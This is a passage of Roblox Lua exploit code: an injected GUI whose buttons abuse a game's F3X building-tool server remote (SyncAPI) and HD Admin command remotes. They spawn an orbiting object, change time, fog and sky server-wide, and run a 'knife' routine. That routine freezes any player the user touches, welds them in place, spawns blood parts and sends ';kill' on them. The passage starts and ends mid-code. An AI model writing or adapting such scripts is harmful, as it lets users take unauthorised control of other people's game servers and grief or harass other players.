		G2L["f"]["Text"] = [[Music]];
		G2L["f"]["Position"] = UDim2.new(-0.00055, 0, 0.80686, 0);
	
	
		-- StarterGui.MainModule.1376962.Frame.TextButton.Script
		G2L["10"] = Instance.new("Script", G2L["f"]);
	
	
	
		-- StarterGui.MainModule.1376962.Frame.TextButton
		G2L["11"] = Instance.new("TextButton", G2L["2"]);
		G2L["11"]["BorderSizePixel"] = 3;
		G2L["11"]["TextSize"] = 30;
		G2L["11"]["TextColor3"] = Color3.fromRGB(255, 255, 0);
		G2L["11"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["11"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["11"]["Size"] = UDim2.new(0, 155, 0, 50);
		G2L["11"]["BorderColor3"] = Color3.fromRGB(255, 255, 0);
		G2L["11"]["Text"] = [[RC7 Cloud]];
		G2L["11"]["Position"] = UDim2.new(-0.00055, 0, 0.99843, 0);
	
	
		-- StarterGui.MainModule.1376962.Frame.TextButton.Script
		G2L["12"] = Instance.new("Script", G2L["11"]);
	
	
	
		-- StarterGui.MainModule.1376962.Frame.TextButton.LocalScript
		G2L["13"] = Instance.new("LocalScript", G2L["11"]);
	
	
	
		-- StarterGui.MainModule.1376962.Frame.TextButton.RemoteEvent
		G2L["14"] = Instance.new("RemoteEvent", G2L["11"]);
	
	
	
		-- StarterGui.MainModule.1376962.Frame.TextButton
		G2L["15"] = Instance.new("TextButton", G2L["2"]);
		G2L["15"]["BorderSizePixel"] = 3;
		G2L["15"]["TextSize"] = 30;
		G2L["15"]["TextColor3"] = Color3.fromRGB(255, 255, 0);
		G2L["15"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["15"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["15"]["Size"] = UDim2.new(0, 144, 0, 50);
		G2L["15"]["BorderColor3"] = Color3.fromRGB(255, 255, 0);
		G2L["15"]["Text"] = [[Tools]];
		G2L["15"]["Position"] = UDim2.new(0.52732, 0, 0.99843, 0);
	
	
		-- StarterGui.MainModule.1376962.Frame.TextButton.Script
		G2L["16"] = Instance.new("Script", G2L["15"]);
	
	
	
		-- StarterGui.MainModule.1376962.Frame.TextButton.LocalScript
		G2L["17"] = Instance.new("LocalScript", G2L["15"]);
	
	
	
		-- StarterGui.MainModule.1376962.Frame.TextButton.RemoteEvent
		G2L["18"] = Instance.new("RemoteEvent", G2L["15"]);
	
	
	
		-- StarterGui.MainModule.1376962.Frame.TextButton
		G2L["19"] = Instance.new("TextButton", G2L["2"]);
		G2L["19"]["BorderSizePixel"] = 3;
		G2L["19"]["TextSize"] = 30;
		G2L["19"]["TextColor3"] = Color3.fromRGB(255, 255, 0);
		G2L["19"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["19"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["19"]["Size"] = UDim2.new(0, 144, 0, 50);
		G2L["19"]["BorderColor3"] = Color3.fromRGB(255, 255, 0);
		G2L["19"]["Text"] = [[Shutdown]];
		G2L["19"]["Position"] = UDim2.new(0.52732, 0, 0.80686, 0);
	
	
		-- StarterGui.MainModule.1376962.Frame.TextButton.Script
		G2L["1a"] = Instance.new("Script", G2L["19"]);
	
	
	
		-- StarterGui.MainModule.1376962.Frame.TextLabel
		G2L["1b"] = Instance.new("TextLabel", G2L["2"]);
		G2L["1b"]["BorderSizePixel"] = 3;
		G2L["1b"]["TextSize"] = 41;
		G2L["1b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["1b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["1b"]["TextColor3"] = Color3.fromRGB(255, 255, 0);
		G2L["1b"]["Size"] = UDim2.new(0, 305, 0, 50);
		G2L["1b"]["BorderColor3"] = Color3.fromRGB(255, 255, 0);
		G2L["1b"]["Text"] = [[XX_ANDRESXX GUI]];
		G2L["1b"]["Position"] = UDim2.new(-0.00082, 0, -0.00436, 0);
	
	
		-- StarterGui.MainModule.1376962.Frame.DragGui
		G2L["1c"] = Instance.new("LocalScript", G2L["2"]);
		G2L["1c"]["Name"] = [[DragGui]];
	
	
		-- StarterGui.MainModule.1376962.Frame.TextButton.LocalScript
		local function C_13()
			local script = G2L["13"];
			script.Parent.MouseButton1Click:Connect(function()
				script.Parent.RemoteEvent:FireServer()
			end)
		end;
		task.spawn(C_13);
		-- StarterGui.MainModule.1376962.Frame.TextButton.LocalScript
		local function C_17()
			local script = G2L["17"];
			script.Parent.MouseButton1Click:Connect(function()
				script.Parent.RemoteEvent:FireServer()
			end)
		end;
		task.spawn(C_17);
		-- StarterGui.MainModule.1376962.Frame.DragGui
		local function C_1c()
			local script = G2L["1c"];
			local UserInputService = game:GetService("UserInputService")
	
			local gui = script.Parent
	
			local dragging
			local dragInput
			local dragStart
			local startPos
	
			local function update(input)
				local delta = input.Position - dragStart
				gui.Position = gui:TweenPosition(UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y), 'Out', 'Linear', 0, true); -- drag speed
			end
	
			gui.InputBegan:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
					dragging = true
					dragStart = input.Position
					startPos = gui.Position
	
					input.Changed:Connect(function()
						if input.UserInputState == Enum.UserInputState.End then
							dragging = false
						end
					end)
				end
			end)
	
			gui.InputChanged:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
					dragInput = input
				end
			end)
	
			UserInputService.InputChanged:Connect(function(input)
				if input == dragInput and dragging then
					update(input)
				end
			end)
		end;
		task.spawn(C_1c);
	
		return G2L["1"], require;
	
		
		
		
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_1a);
-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
local function C_1c()
local script = G2L["1c"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
	
	
	
		local player = game.Players.LocalPlayer
		local char = player.Character or player.CharacterAdded:Wait()
		local hrp = char:WaitForChild("HumanoidRootPart")
	
		-- Find F3X Tool
		local tool
		for _, v in ipairs(player:GetDescendants()) do
			if v.Name == "SyncAPI" then tool = v.Parent break end
		end
		if not tool then
			for _, v in ipairs(game.ReplicatedStorage:GetDescendants()) do
				if v.Name == "SyncAPI" then tool = v.Parent break end
			end
		end
	
		if not tool then
			warn("❌ F3X / Building Tools not found! Do ;btools first")
			return
		end
	
		local remote = tool.SyncAPI.ServerEndpoint
		local rq = game.ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		local function _(args) remote:InvokeServer(unpack(args)) end
	
		local function CreatePart(cf, parent, shape)
			return remote:InvokeServer("CreatePart", shape or "Normal", cf, parent)
		end
	
		local function Resize(part, size, cf)
			_({"SyncResize", {{Part = part, CFrame = cf, Size = size}}})
		end
	
		local function MovePart(part, cf)
			_({"SyncMove", {{Part = part, CFrame = cf}}})
		end
	
		local function Color(part, color)
			_({"SyncColor", {{Part = part, Color = color, UnionColoring = false}}})
		end
	
		local function SetAnchor(part, bool)
			_({"SyncAnchor", {{Part = part, Anchored = bool}}})
		end
	
		local function SetCollision(part, bool)
			_({"SyncCollision", {{Part = part, CanCollide = bool}}})
		end
	
		local function SetLocked(part, bool)
			_({"SetLocked", {part}, bool})
		end
	
		local function SetTrans(part, num)
			_({"SyncMaterial", {{Part = part, Transparency = num}}})
		end
	
		local function mat(part, material)
			_({"SyncMaterial", {{Part = part, Material = material}}})
		end
	
		local function AddMesh(part)
			_({"CreateMeshes", {{Part = part}}})
		end
	
		local function SetMeshType(part, meshType)
			_({"SyncMesh", {{Part = part, MeshType = meshType}}})
		end
	
		local function MeshResize(part, scale)
			_({"SyncMesh", {{Part = part, Scale = scale}}})
		end
	
		local function DestroyPart(part)
			_({"Remove", {part}})
		end
	
		local function Clone(part, parent)
			return remote:InvokeServer("Clone", {part}, parent)
		end
	
		local function SetName(part, name)
			_({"SetName", {part}, name})
		end
	
	
		rq:InvokeServer(";title me Welcome to i0rb " .. player.DisplayName .. "'! i0rb remade by scrubl0rd the current prefix is :! Say :cmds to show a list of commands!")
	
		local cf = hrp.CFrame * CFrame.new(6, 2, 0)
		local pad = CreatePart(cf, workspace, "Ball")
		Clone(char.Head, pad)
	
		rq:InvokeServer(";untitle me")
	
	
		Resize(pad, Vector3.new(1,1,1), cf)
		SetAnchor(pad, true)
		mat(pad, Enum.Material.Neon)
		SetCollision(pad, false)
		SetLocked(pad, true)
		SetName(pad, "iOrb Remake by skyl0rd")
	
		AddMesh(pad)
		SetMeshType(pad, Enum.MeshType.Sphere)
		MeshResize(pad, Vector3.new(1,1,1))
		Color(pad, Color3.fromRGB(0,0,0))
	
	
		local nameHead = pad:FindFirstChild("Head")
		if nameHead then
			SetAnchor(nameHead, true)
			SetTrans(nameHead, 1)
			if nameHead:FindFirstChild("face") then DestroyPart(nameHead.face) end
			SetCollision(nameHead, false)
		end
	
	
		local radius = 5
		local speed = 2
		local t = 0
	
		game:GetService("RunService").RenderStepped:Connect(function(delta)
			if not (pad and hrp) then return end
			t = t + delta * speed
			local x = math.cos(t) * radius
			local y = math.sin(t * 1.5) * radius * 0.5
			local z = math.sin(t) * radius
			local newCF = CFrame.new(hrp.Position + Vector3.new(x, y, z))
			MovePart(pad, newCF)
			if nameHead then MovePart(nameHead, newCF) end
		end)
	
	
		while task.wait(0.0005) do
			if char:FindFirstChild("Humanoid") and char.Humanoid.Health <= 0 then break end
	
			local p2 = CreatePart(CFrame.new(), pad, "Normal")
			Resize(p2, Vector3.new(0.3,0.3,0.3), pad.CFrame)
			SetAnchor(p2, true)
			SetCollision(p2, false)
			Color(p2, Color3.fromRGB(0,0,0))
			SetTrans(p2, 0.3)
			mat(p2, Enum.Material.Neon)
	
			task.wait(0.01)
			DestroyPart(p2)
		end
		
		
		
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_1c);
-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
local function C_1e()
local script = G2L["1e"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
		local player = game.Players.LocalPlayer
		local character = player.Character or player.CharacterAdded:Wait()
		local RunService = game:GetService("RunService")
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandModification
		local Players = game:GetService("Players")
		local UserInputService = game:GetService("UserInputService")
	
		if not character:FindFirstChild('Accessory (KNIF4ELERFTAccessory)') or character:FindFirstChild("Accessory (Knife McGrabbington III)") then
			ready = false
		end
	
		local function notify(msg)
			local MainGUI = player:FindFirstChild("PlayerGui"):FindFirstChild("MainGUI")
			if not MainGUI then
				MainGUI = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
				MainGUI.Name = "MainGUI"
			end
			coroutine.wrap(function()
				for _, v in pairs(MainGUI:GetChildren()) do
					if v:IsA("TextLabel") then v:Destroy() end
				end
				local TextLabel = Instance.new("TextLabel")
				local Frame = Instance.new("Frame")
				TextLabel.Parent = MainGUI
				TextLabel.BackgroundColor3 = Color3.fromRGB(58, 58, 58)
				TextLabel.BorderSizePixel = 0
				TextLabel.Position = UDim2.new(0.2, 0, 0.05, -10)
				TextLabel.Size = UDim2.new(0.6, 0, 0.1, 0)
				TextLabel.Font = Enum.Font.SourceSans
				TextLabel.TextColor3 = Color3.new(1, 1, 1)
				TextLabel.TextSize = 35
				TextLabel.TextScaled = true
				TextLabel.TextYAlignment = Enum.TextYAlignment.Center
				TextLabel.TextXAlignment = Enum.TextXAlignment.Left
				TextLabel.Text = ""
				TextLabel.BackgroundTransparency = 1
				Frame.Parent = TextLabel
				Frame.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
				Frame.BorderSizePixel = 0
				Frame.Transparency = 1
				Frame.Position = UDim2.new(0, 0, 1, 0)
				Frame.Size = UDim2.new(1, 0, 0, 5)
				for i = 1, 8 do
					TextLabel.BackgroundTransparency = TextLabel.BackgroundTransparency - 0.1
					TextLabel.Position = TextLabel.Position + UDim2.new(0, 0, 0, 1)
					Frame.Transparency = Frame.Transparency - 0.1
					task.wait()
				end
				msg = " " .. msg
				for i = 1, #msg do
					TextLabel.Text = string.sub(msg, 1, i)
					task.wait()
				end
				task.wait(1)
				for i = 1, 8 do
					TextLabel.BackgroundTransparency = TextLabel.BackgroundTransparency + 0.1
					TextLabel.Position = TextLabel.Position - UDim2.new(0, 0, 0, 2)
					Frame.Transparency = Frame.Transparency + 0.1
					task.wait()
				end
				TextLabel:Destroy()
			end)()
		end
	
		RequestCommand:InvokeServer(";hat me 18268136683")
	
		yeah = player.Backpack:FindFirstChild('Building Tools') or player.Backpack:FindFirstChild('F3X Btools!')
		if yeah then
			notify("Press Z to equip. Created by skyl0rd and r0pyz.")
			task.wait(3)
			notify("Press 'Z' to equip. Click or Tap to attack")
		elseif not yeah then
			notify("Press Z to equip. Created by skyl0rd and r0pyz.")
		end
	
		local tool
		for _, v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for _, v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		local remote = tool.SyncAPI.ServerEndpoint
	
		function _(args)
			remote:InvokeServer(unpack(args))
		end
	
		function SetCollision(part, boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
	
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
	
		function yerpp(E)
			local argsCreate = {
				[1] = "CreateDecorations",
				[2] = {
					[1] = {
						["Part"] = E,
						["DecorationType"] = "Sparkles"
					}
				}
			}
			local argsSync = {
				[1] = "SyncDecorate",
				[2] = {
					[1] = {
						["Part"] = E,
						["DecorationType"] = "Sparkles",
						["SparkleColor"] = Color3.fromRGB(255, 255, 0)
					}
				}
			}
			_(argsCreate)
			_(argsSync)
		end
	
		local knfe = character["Accessory (Knife McGrabbington III)"]
		if knfe then
			local args = {
				"Remove",
				{
					knfe.Handle.SpecialMesh
				}
			}
			_(args)
		end
	
		local function Resize(part, size, ha)
			local args = {
				"SyncResize",
				{
					{
						Part = part,
						CFrame = ha,
						Size = size
					}
				}
			}
			_(args)
		end
	
		local function SetAnchor(boolean, part)
			local args = {
				"SyncAnchor",
				{
					{
						Part = part,
						Anchored = boolean
					}
				}
			}
			_(args)
		end
	
		function MovePart(part, cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
	
		local function Color(part, color)
			local args = {
				"SyncColor",
				{
					{
						Part = part,
						Color = color,
						UnionColoring = false
					}
				}
			}
			_(args)
		end
	
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid,offseter)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Offset"] = offseter,
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
	
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://" .. texid
					}
				}
			}
			_(args)
		end
	
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
	
		spawn(function()
			yerpp(knfe.Handle)
		end)
		spawn(function()
			AddMesh(knfe.Handle)
		end)
		spawn(function()
			SetMesh(knfe.Handle, "18114736783",Vector3.new(0, 0, 0))
		end)
		spawn(function()
			SetTexture(knfe.Handle, "80617091791234")
		end)
	
		function bleed(target)
			if not target or not target.Character then return end
			local stopBleeding = false
			local activeBloodParts = {}
			local characterConnection
			characterConnection = target.CharacterAdded:Connect(function()
				stopBleeding = true
				for _, blood in pairs(activeBloodParts) do
					if blood and blood.Parent then
						DestroyPart(blood)
					end
				end
				if characterConnection then
					characterConnection:Disconnect()
				end
			end)
			coroutine.wrap(function()
				while not stopBleeding and target and target.Character do
					local humanoid = target.Character:FindFirstChildOfClass("Humanoid")
					local rootPart = target.Character:FindFirstChild("HumanoidRootPart")
					if rootPart then
						coroutine.wrap(function()
							yez=CFrame.new(0,-10,0)
							local blood = remote:InvokeServer("CreatePart", "Ball", yez, target.Character)
							if blood then
								table.insert(activeBloodParts, blood)
								spawn(function()
									Color(blood, Color3.fromRGB(255, 0, 0))
								end)
								spawn(function()
									Resize(blood, Vector3.new(0.2, 0.2, 0.2), rootPart.CFrame + Vector3.new(math.random(-1,1),0,math.random(-1,1)))
								end)
								spawn(function()
									SetAnchor(false, blood)
								end)
								coroutine.wrap(function()
									wait(2)
									Resize(blood, Vector3.new(0.8, 0.1, 0.8),blood.CFrame)
									Resize(blood, Vector3.new(0.9, 0.1, 0.9),blood.CFrame)
									SetTrans(blood, 0.9)
									SetTrans(blood, 0.7)
									SetTrans(blood, 0.5)
									SetTrans(blood, 0.3)
									SetTrans(blood, 0.1)
									DestroyPart(blood)
									for i, v in pairs(activeBloodParts) do
										if v == blood then
											table.remove(activeBloodParts, i)
											break
										end
									end
								end)()
							end
						end)()
					end
					wait(0.005)
				end
			end)()
		end
	
		function c0lefect(E)
			local argsCreate = {
				[1] = "CreateDecorations",
				[2] = {
					[1] = {
						["Part"] = E,
						["DecorationType"] = "Sparkles"
					}
				}
			}
			local argsSync = {
				[1] = "SyncDecorate",
				[2] = {
					[1] = {
						["Part"] = E,
						["DecorationType"] = "Sparkles",
						["SparkleColor"] = Color3.fromRGB(255, 255, 0)
					}
				}
			}
			local args = {
				"Remove",
				{
					E:FindFirstChild('Sparkles')
				}
			}
			_(argsCreate)
			_(argsSync)
			task.wait(1)
			_(args)
		end
	
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
		end
	
		function breakWelds(part)
			local welds = {}
			for _, weld in ipairs(part:GetDescendants()) do
				if weld:IsA("WeldConstraint") or weld:IsA("Weld") or weld:IsA("Motor6D") then
					table.insert(welds, weld)
				end
			end
			if #welds == 0 then
				return false
			end
			local args = {
				"RemoveWelds",
				welds
			}
			_(args)
			return true
		end
	
		local humanoid = character:FindFirstChildOfClass("Humanoid")
		local arm = character:FindFirstChild("Right Arm") and character:FindFirstChild("Left Arm") and character:FindFirstChild("Torso")
		local holdAnimation = Instance.new("Animation")
		holdAnimation.AnimationId = "rbxassetid://48146273"
		local holdTrack = humanoid:LoadAnimation(holdAnimation)
		local killAnimation = Instance.new("Animation")
		killAnimation.AnimationId = "rbxassetid://48146273"
		local killTrack = humanoid:LoadAnimation(killAnimation)
		local knifeHoldAnim = Instance.new("Animation")
		knifeHoldAnim.AnimationId = "rbxassetid://299225058"
		local staffupAnim = Instance.new("Animation")
		staffupAnim.AnimationId = "rbxassetid://27432691"
		local swordhitAnim = Instance.new("Animation")
		swordhitAnim.AnimationId = "rbxassetid://27432686"
		local holdstaffAnim = Instance.new("Animation")
		holdstaffAnim.AnimationId = "rbxassetid://57794492"
		local stabAnim = Instance.new("Animation")
		stabAnim.AnimationId = "rbxassetid://30174375"
		local track1 = humanoid:LoadAnimation(staffupAnim)
		local track2 = humanoid:LoadAnimation(swordhitAnim)
		holdTrack = humanoid:LoadAnimation(holdstaffAnim)
	
		function GrabAnim()
			track1.Looped = false
			track2.Looped = false
			holdTrack.Looped = false
			track1:Play()
			track1.Stopped:Wait()
			track2:Play()
			track2.Stopped:Wait()
			holdTrack:Play()
			holdTrack:AdjustSpeed(0)
		end
	
		function Kill()
			local stabTrack = humanoid:LoadAnimation(stabAnim)
			stabTrack.Looped = false
			stabTrack:Play()
			stabTrack.Stopped:Wait()
			if holdTrack then holdTrack:Stop() end
		end
	
		function failed()
			track1.Looped = false
			track2.Looped = false
			holdTrack.Looped = false
			track1:Play()
			track1:AdjustSpeed(3)
			track1.Stopped:Wait()
			holdTrack:Play()
			wait(0.3)
			holdTrack:Stop()
		end
	
		local isBusy = false
		local alignPosition
		local alignOrientation
	
		local function attachBehind(targetChar)
			local root = character:FindFirstChild("HumanoidRootPart")
			local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
			if root and targetRoot then
				local attachment0 = root:FindFirstChild("Attachment") or Instance.new("Attachment", root)
				local attachment1 = targetRoot:FindFirstChild("Attachment") or Instance.new("Attachment", targetRoot)
				alignPosition = Instance.new("AlignPosition")
				alignPosition.MaxForce = 1000000
				alignPosition.Responsiveness = 200
				alignPosition.Attachment0 = attachment0
				alignPosition.Attachment1 = attachment1
				alignPosition.Parent = root
				alignOrientation = Instance.new("AlignOrientation")
				alignOrientation.MaxTorque = 1000000
				alignOrientation.Responsiveness = 200
				alignOrientation.Attachment0 = attachment0
				alignOrientation.Attachment1 = attachment1
				alignOrientation.Parent = root
				attachment1.Position = Vector3.new(0, 0, 0.5)
			end
		end
	
		local function detach()
			if alignPosition then
				alignPosition:Destroy()
				alignPosition = nil
			end
			if alignOrientation then
				alignOrientation:Destroy()
				alignOrientation = nil
			end
		end
	
		local function attacke()
			if isBusy then return end
			isBusy = true
			local hitPlayer = nil
			local touchedConnection
			local function onTouch(other)
				local otherPlayer = Players:GetPlayerFromCharacter(other.Parent)
				if otherPlayer and otherPlayer ~= player then
					hitPlayer = otherPlayer
				end
			end
			touchedConnection = arm.Touched:Connect(onTouch)
			task.wait(0.15)
			if touchedConnection then
				touchedConnection:Disconnect()
			end
			if hitPlayer and hitPlayer.Character then
				RequestCommand:InvokeServer(";speed " ..hitPlayer.Name.. " 0")
				track1.Looped = false
				track2.Looped = false
				holdTrack.Looped = false
				track1:Play()
				track1.Stopped:Wait()
				track2:Play()
				track2:AdjustSpeed(3)
				track2.Stopped:Wait()
				holdTrack:Play()
				holdTrack:AdjustSpeed(0)
				spawn(function()
					attachBehind(hitPlayer.Character)
					wait(0.8)
					detach()
				end)
				spawn(function()
					SetLocked(hitPlayer.Character.Torso, false)
				end)
				spawn(function()
					SetLocked(character.Torso, false)
				end)
				Weld(character.Torso,hitPlayer.Character.Torso,character.Torso)
				Weld(character.Torso,hitPlayer.Character.HumanoidRootPart,character.Torso)
				Weld(character.Torso,hitPlayer.Character.Head,character.Torso)
				wait(3)
				spawn(function()
					Kill()
				end)
				bleed(hitPlayer)
				wait(0.5)
				RequestCommand:InvokeServer(";kill " ..hitPlayer.Name)
				wait(0.5)
				breakWelds(character.Torso)
				breakWelds(hitPlayer.Character.Torso)
				spawn(function()
					wait(0.8)
					spawn(function()
						SetLocked(hitPlayer.Character.Torso, false)
					end)
					spawn(function()
						SetLocked(hitPlayer.Character["Right Arm"], false)
					end)
					spawn(function()
						SetLocked(hitPlayer.Character["Left Arm"], false)
					end)
					spawn(function()
						SetLocked(hitPlayer.Character["Right Leg"], false)
					end)
					spawn(function()
						SetLocked(hitPlayer.Character["Left Leg"], false)
					end)
					spawn(function()
						SetCollision(hitPlayer.Character.Torso, true)
					end)
					spawn(function()
						SetCollision(hitPlayer.Character["Right Arm"], true)
					end)
					spawn(function()
						SetCollision(hitPlayer.Character["Left Arm"], true)
					end)
					spawn(function()
						SetCollision(hitPlayer.Character["Right Leg"], true)
					end)
					spawn(function()
						SetCollision(hitPlayer.Character["Left Leg"], true)
					end)
				end)
				wait(0.3)
				isBusy = false
			else
				failed()
				wait(0.4)
				isBusy = false
			end
		end
	
	
		UserInputService.InputBegan:Connect(function(input, gameProcessed)
			if gameProcessed then return end
			if input.KeyCode == Enum.KeyCode.Z then
				local args = {
					"Remove",
					{
						knfe.Handle
					}
				}
				_(args)
				knfe:Destroy()
				RequestCommand:InvokeServer(";hat me 18420472059")
				wait(1)
				local knife = character:FindFirstChild("Accessory (KNIF4ELERFTAccessory)")
				spawn(function()
					local args = {
						"Remove",
						{
							knife.Handle.SpecialMesh
						}
					}
					_(args)
				end)
				spawn(function()
					AddMesh(knife.Handle)
				end)
				spawn(function()
					SetMesh(knife.Handle, "18114736783", Vector3.new(0, 0,-0.25))
				end)
				spawn(function()
					SetTexture(knife.Handle, "80617091791234")
				end)
				ready = true
			end
		end)
	
	
		UserInputService.InputBegan:Connect(function(input, gameProcessed)
			if gameProcessed then return end
			if ready == true then
				if input.UserInputType == Enum.UserInputType.MouseButton1 then
					attacke()
				end
			end
		end)
	
	
		UserInputService.TouchTap:Connect(function(touchPositions, gameProcessed)
			if gameProcessed then return end
			if ready == true then
				attacke()
			end
		end)
	
		
		
		
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_1e);
-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
local function C_20()
local script = G2L["20"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommandSilent:InvokeServer(";time 0")
		RequestCommandSilent:InvokeServer(";fogcolor black")
	
		local player = game.Players.LocalPlayer
		local char = player.Character or player.CharacterAdded:Wait()
		local tool
	
		for i, v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		for i, v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		local remote = tool.SyncAPI.ServerEndpoint
		local RunService = game:GetService("RunService")
	
		function _(args)
			remote:InvokeServer(unpack(args))
		end
	
		function CreatePart(cf, parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
	
		function SetAnchor(part, boolean)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
	
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part, meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://" .. meshid
					}
				}
			}
			_(args)
		end
	
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = texid
					}
				}
			}
			_(args)
		end
	
		function MeshResize(part, size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
	
		function SetTransparency(part, value)
			local args = {
				[1] = "SyncTransparency",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = value
					}
				}
			}
			_(args)
		end
	
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
	
		local images = {
			"http://www.roblox.com/asset/?id=0",
	
		}
	
		local skyPart
		local skyLoop
		local frameTime = 1 / 10
		local lastUpdate = 0
	
		function CreateSky()
			local hrp = char:FindFirstChild("HumanoidRootPart")
			if not hrp then return end
	
			local cf = hrp.CFrame
			CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace)
	
			local found = false
			for i = 1, 50 do
				task.wait()
				for _, v in workspace:GetDescendants() do
					if v:IsA("BasePart") and (v.Position - (cf.Position + Vector3.new(0, 6, 0))).Magnitude < 1 then
						skyPart = v
						found = true
						break
					end
				end
				if found then break end
			end
	
			if not skyPart then return end
	
			SetAnchor(skyPart, true)
			AddMesh(skyPart)
			SetMesh(skyPart, "111891702759441")
			MeshResize(skyPart, Vector3.new(888, 888, 888))
			SetTransparency(skyPart, 0)
	
			local index = 1
			skyLoop = RunService.Heartbeat:Connect(function(deltaTime)
				lastUpdate = lastUpdate + deltaTime
				if lastUpdate >= frameTime then
					lastUpdate = 0
					if not skyPart then
						skyLoop:Disconnect()
						return
					end
					SetTexture(skyPart, images[index])
					index = (index % #images) + 0.1
				end
			end)
		end
	
		function ResetSky()
			if skyLoop then
				skyLoop:Disconnect()
				skyLoop = nil
			end
			if skyPart then
				DestroyPart(skyPart)
				skyPart = nil
			end
			task.spawn(CreateSky)
		end
	
		player.CharacterAdded:Connect(function(newChar)
			char = newChar
			ResetSky()
		end)
	
		if char and char:FindFirstChild("Humanoid") then
			char:WaitForChild("Humanoid").Died:Connect(function()
				ResetSky()
			end)
		end
	
		CreateSky()
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
	
		-- Find SyncAPI tool (same as your original)
		for _, v in ipairs(player:GetDescendants()) do
			if v.Name == "SyncAPI" then
				tool = v.Parent
				break
			end
		end
		if not tool then
			for _, v in ipairs(game.ReplicatedStorage:GetDescendants()) do
